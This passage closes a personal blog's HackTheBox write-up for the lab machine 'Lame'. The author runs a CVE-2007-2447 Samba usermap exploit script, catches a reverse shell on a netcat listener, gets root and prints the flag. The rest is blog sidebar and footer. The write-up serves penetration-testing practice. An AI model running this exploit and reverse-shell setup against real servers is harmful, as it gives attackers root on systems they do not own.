+<p>For this script to work I need to ensure that the IP addresses and ports used by Lame and my attacking box are correct.  With the checks done, I can now proceed with the exploit.</p>
+<pre><code>student@teacher:~/hackthebox/Lame/CVE-2007-2447$ python usermap_script.py 10.10.10.3 445 10.10.16.195 4444
+[*] CVE-2007-2447 - Samba usermap script
+[+] Connecting !
+[+] Payload was sent - check netcat !
+</code></pre><h1 id="post-exploitation-1"><strong>Post Exploitation</strong></h1>
+<p>The python script is successful and a reverse shell connection is established.</p>
+<h3 id="step-1---access-lame-file-system">Step 1 - Access Lame file system</h3>
+<pre><code>student@teacher:~$ nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.195] from (UNKNOWN) [10.10.10.3] 45434
+</code></pre><p>The first thing I need to do is determine what user I am and whether I need to perform any privesc to get the root flag.</p>
+<pre><code>whoami
+root
+</code></pre><h3 id="step-2---find-root-flag-1">Step 2 - Find root flag</h3>
+<p>With root privileges I can view all the file&rsquo;s present on Lame. I list all the files in my current working directory to see what I am working with.</p>
+<pre><code>ls -la
+total 97
+drwxr-xr-x  21 root root  4096 May 20  2012 .
+drwxr-xr-x  21 root root  4096 May 20  2012 ..
+drwxr-xr-x   2 root root  4096 May 13  2012 bin
+drwxr-xr-x   4 root root  1024 May 13  2012 boot
+lrwxrwxrwx   1 root root    11 Apr 28  2010 cdrom -&gt; media/cdrom
+drwxr-xr-x  13 root root 13560 Jul  1 07:01 dev
+drwxr-xr-x  95 root root  4096 Jul  1 07:01 etc
+drwxr-xr-x   6 root root  4096 Mar 14  2017 home
+drwxr-xr-x   2 root root  4096 Mar 16  2010 initrd
+lrwxrwxrwx   1 root root    32 Apr 28  2010 initrd.img -&gt; boot/initrd.img-2.6.24-16-server
+drwxr-xr-x  13 root root  4096 May 13  2012 lib
+drwx------   2 root root 16384 Mar 16  2010 lost+found
+drwxr-xr-x   4 root root  4096 Mar 16  2010 media
+drwxr-xr-x   3 root root  4096 Apr 28  2010 mnt
+-rw-------   1 root root 14473 Jul  1 07:02 nohup.out
+drwxr-xr-x   2 root root  4096 Mar 16  2010 opt
+dr-xr-xr-x 109 root root     0 Jul  1 07:01 proc
+drwxr-xr-x  13 root root  4096 Jul  1 07:02 root
+drwxr-xr-x   2 root root  4096 May 13  2012 sbin
+drwxr-xr-x   2 root root  4096 Mar 16  2010 srv
+drwxr-xr-x  12 root root     0 Jul  1 07:01 sys
+drwxrwxrwt   4 root root  4096 Jul  1 07:33 tmp
+drwxr-xr-x  12 root root  4096 Apr 28  2010 usr
+drwxr-xr-x  15 root root  4096 May 20  2012 var
+lrwxrwxrwx   1 root root    29 Apr 28  2010 vmlinuz -&gt; boot/vmlinuz-2.6.24-16-server
+</code></pre><p>There are several files and folders in my current directory but see the <code>root</code> folder I want.</p>
+<pre><code>cd root
+ls
+Desktop
+reset_logs.sh
+root.txt
+vnc.log
+</code></pre><p>I see the root.txt I want.</p>
+<pre><code>cat root.txt
+92caac3be140ef409e45721348a4e9df
+</code></pre><p>Pwned. Again!</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>This box was definitely a learning expierence for me since I had never done privesc of any kind before.  I was surprised about the variety of services and features that can be abused to escalate my privileges in a target system.</p>
+
+					</div>
+					<div class="post-comments">
+						
+					</div>
+				</div>
+			</div>
+      <div class="col-md-4">
+        <aside class="sidebar"><div class="widget widget-latest-post">
+    <h4 class="widget-title">Latest Posts</h4>
+    
+    <div class="media">
+      <a class="pull-left" href="http://192.168.1.191/blog/nibbles/">
+        <img class="media-object" src="/images/blog/nibbles/nibbles_image.jpg" alt="Nibbles HackTheBox - Write-Up">
+      </a>
+      <div class="media-body">
+        <h4 class="media-heading"><a href="http://192.168.1.191/blog/nibbles/">Nibbles HackTheBox - Write-Up</a></h4>
+        <p>This writeup will demonstrate my approach for …</p>
+      </div>
+    </div>
+    
+    <div class="media">
+      <a class="pull-left" href="http://192.168.1.191/blog/jerry/">
+        <img class="media-object" src="/images/blog/jerry/snippet_1.png" alt="Jerry HackTheBox - Write-Up">
+      </a>
+      <div class="media-body">
+        <h4 class="media-heading"><a href="http://192.168.1.191/blog/jerry/">Jerry HackTheBox - Write-Up</a></h4>
+        <p>This writeup will be my approach for …</p>
+      </div>
+    </div>
+    
+    <div class="media">
+      <a class="pull-left" href="http://192.168.1.191/blog/devel/">
+        <img class="media-object" src="/images/blog/devel/cover.jpg" alt="Devel HackTheBox - Write-Up">
+      </a>
+      <div class="media-body">
+        <h4 class="media-heading"><a href="http://192.168.1.191/blog/devel/">Devel HackTheBox - Write-Up</a></h4>
+        <p>The first three &lsquo;HackTheBox&rsquo; writeups …</p>
+      </div>
+    </div>
+    
+    <div class="media">
+      <a class="pull-left" href="http://192.168.1.191/blog/blue/">
+        <img class="media-object" src="/images/blog/blue/cover.jpg" alt="Blue HackTheBox - Write-Up">
+      </a>
+      <div class="media-body">
+        <h4 class="media-heading"><a href="http://192.168.1.191/blog/blue/">Blue HackTheBox - Write-Up</a></h4>
+        <p>This blog piece details my approach for pwning the …</p>
+      </div>
+    </div>
+    
+  </div><div class="widget widget-category">
+    <h4 class="widget-title">Categories</h4>
+    <ul class="widget-category-list">
+      <li><a href="/categories/hackthebox">Hackthebox</a></li>
+    </ul>
+  </div><div class="widget widget-tag">
+    <h4 class="widget-title">Tags</h4>
+    <ul class="widget-tag-list">
+      <li><a href="/tags/apache">Apache</a></li>
+      <li><a href="/tags/distcc">Distcc</a></li>
+      <li><a href="/tags/eternalblue">Eternalblue</a></li>
+      <li><a href="/tags/exploit-compilation">Exploit compilation</a></li>
+      <li><a href="/tags/exploit-modification">Exploit modification</a></li>
+      <li><a href="/tags/ftp">Ftp</a></li>
+      <li><a href="/tags/hackthebox">Hackthebox</a></li>
+      <li><a href="/tags/http">Http</a></li>
+      <li><a href="/tags/linux">Linux</a></li>
+      <li><a href="/tags/misconfiguration">Misconfiguration</a></li>
+      <li><a href="/tags/privesc">Privesc</a></li>
+      <li><a href="/tags/smb">Smb</a></li>
+      <li><a href="/tags/spidering">Spidering</a></li>
+      <li><a href="/tags/tty">Tty</a></li>
+      <li><a href="/tags/tty-shell">Tty shell</a></li>
+      <li><a href="/tags/web-shell">Web shell</a></li>
+      <li><a href="/tags/windows">Windows</a></li>
+    </ul>
+  </div></aside>
+
+      </div>
+		</div>
+	</div>
+</section>
+
+<footer class="footer">
+	<div class="container">
+		<div class="row">
+			<div class="col-md-12">
+				<div class="footer-manu">
+					<ul>
+            
+            <li><a href="http://192.168.1.191/about">About</a></li>
+            
+            <li><a href="http://192.168.1.191/project">Project</a></li>
+            
+            <li><a href="http://192.168.1.191/blog">Blog</a></li>
+            
+					</ul>
+				</div>
+				<p class="copyright">Copyright © 2020 <a href="https://themefisher.com">Themefisher</a> All Rights Reserved</p>
+			</div>
+		</div>
+	</div>
+</footer>
+
+
+
+<script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyCcABaamniA6OL5YvYSpB3pFMNrXwXnLwU&amp;libraries=places"></script>
+
+
+
+
+<script src="http://192.168.1.191/plugins/jQuery/jquery.min.js"></script>
+
+<script src="http://192.168.1.191/plugins/bootstrap/bootstrap.min.js"></script>
+
+<script src="http://192.168.1.191/plugins/slick/slick.min.js"></script>
+
+<script src="http://192.168.1.191/plugins/magnific-popup/jquery.magnific-popup.min.js"></script>
+
+<script src="http://192.168.1.191/plugins/shuffle/shuffle.min.js"></script>
+
+<script src="http://192.168.1.191/plugins/google-map/gmap.js"></script>
+
+
+
+
+<script src="http://192.168.1.191/js/script.min.js"></script>
+
+
+</body>
+
+</html>
